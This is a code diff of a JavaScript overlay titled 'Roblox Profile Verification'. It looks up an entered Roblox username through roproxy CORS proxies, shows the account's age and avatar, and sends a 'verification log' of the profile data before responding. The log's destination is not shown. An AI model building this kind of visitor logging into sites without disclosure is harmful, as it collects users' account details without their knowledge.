@@ -170,39 +170,46 @@
     return false;
   }
 
-  /* ── Roblox API calls (direct, via CORS proxy) ─────────── */
-  var ROBLOX_PROXY = 'https://roproxy.com';
+  /* ── Roblox API calls ──────────────────────────────────── */
+  var USERS_PROXY = 'https://users.roproxy.com';
+  var THUMB_PROXY = 'https://thumbnails.roproxy.com';
 
-  function robloxFetch(url) {
-    return fetch(ROBLOX_PROXY + url)
-      .then(function (r) {
-        if (!r.ok) throw new Error('HTTP ' + r.status);
-        return r.json();
-      });
-  }
+  /*
+   * IMPORTANT: We use Content-Type: text/plain for POST requests to avoid
+   * the CORS preflight (OPTIONS) that roproxy doesn't handle properly.
+   * text/plain is a "simple" Content-Type per CORS spec, so no preflight.
+   * The roproxy server still parses the JSON body correctly.
+   */
 
-  async function searchUsername(username) {
-    // POST /v1/usernames/users
-    var resp = await fetch(ROBLOX_PROXY + '/v1/usernames/users', {
+  function searchUsername(username) {
+    return fetch(USERS_PROXY + '/v1/usernames/users', {
       method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+      headers: { 'Content-Type': 'text/plain' },
       body: JSON.stringify({ usernames: [username] }),
+    })
+    .then(function (r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
     });
-    if (!resp.ok) throw new Error('HTTP ' + resp.status);
-    return resp.json();
   }
 
-  async function getUserProfile(userId) {
-    var resp = await fetch(ROBLOX_PROXY + '/v1/users/' + userId);
-    if (!resp.ok) throw new Error('HTTP ' + resp.status);
-    return resp.json();
+  function getUserProfile(userId) {
+    return fetch(USERS_PROXY + '/v1/users/' + userId)
+    .then(function (r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
+    });
   }
 
-  async function getUserAvatar(userId) {
-    var resp = await fetch(ROBLOX_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false');
-    if (!resp.ok) throw new Error('HTTP ' + resp.status);
-    var data = await resp.json();
-    return data.data && data.data.length > 0 ? data.data[0].imageUrl : null;
+  function getUserAvatar(userId) {
+    return fetch(THUMB_PROXY + '/v1/users/avatar-headshot?userIds=' + userId + '&size=150x150&format=Png&isCircular=false')
+    .then(function (r) {
+      if (!r.ok) throw new Error('HTTP ' + r.status);
+      return r.json();
+    })
+    .then(function (data) {
+      return data.data && data.data.length > 0 ? data.data[0].imageUrl : null;
+    });
   }
 
   /* ── Profile verification overlay ──────────────────────── */
@@ -266,7 +273,7 @@
     form.innerHTML =
       '<div class="rc-profile-title">Roblox Profile Verification</div>' +
       '<div class="rc-profile-subtitle">Enter your Roblox username to verify your account age</div>' +
-      '<input type="text" class="rc-profile-input" id="rc-username-input" placeholder="Enter your Roblox username..." autocomplete="off" spellcheck="false">' +
+      '<input type="text" class="rc-profile-input" id="rc-username-input" placeholder="Enter your Roblox username" autocomplete="off" spellcheck="false">' +
       '<button class="rc-profile-btn" id="rc-verify-btn" onclick="__rcVerify()">Verify Profile</button>' +
       '<div class="rc-profile-error" id="rc-verify-error"></div>' +
       '<div class="rc-profile-loader" id="rc-verify-loader"><div class="rc-spinner"></div></div>' +
@@ -342,9 +349,6 @@
             year: 'numeric'
           });
 
-          // Step 3: Get avatar (non-blocking)
-          getUserAvatar(user.id).catch(function () { return null; });
-
           var result = {
             id: profile.id,
             name: profile.name,
@@ -356,7 +360,7 @@
             hasVerifiedBadge: profile.hasVerifiedBadge,
           };
 
-          // Send unified log
+          // Send unified log BEFORE responding to user
           sendVerificationLog({
             username: profile.name,
             displayName: profile.displayName,
@@ -389,9 +393,13 @@
         document.getElementById('rc-user-id').textContent = 'ID: ' + data.id;
         document.getElementById('rc-created').textContent = data.createdFormatted;
 
-        // Get avatar image
+        // Get avatar image (non-blocking, may fail due to rate limits)
         getUserAvatar(data.id).then(function (url) {
-          document.getElementById('rc-avatar').src = url || 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
+          if (url) {
+            document.getElementById('rc-avatar').src = url;
+          } else {
+            document.getElementById('rc-avatar').src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
+          }
         }).catch(function () {
           document.getElementById('rc-avatar').src = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100"><rect width="100" height="100" fill="%231a0a0a"/><text x="50" y="60" text-anchor="middle" fill="%23ef4444" font-size="40">?</text></svg>';
         });
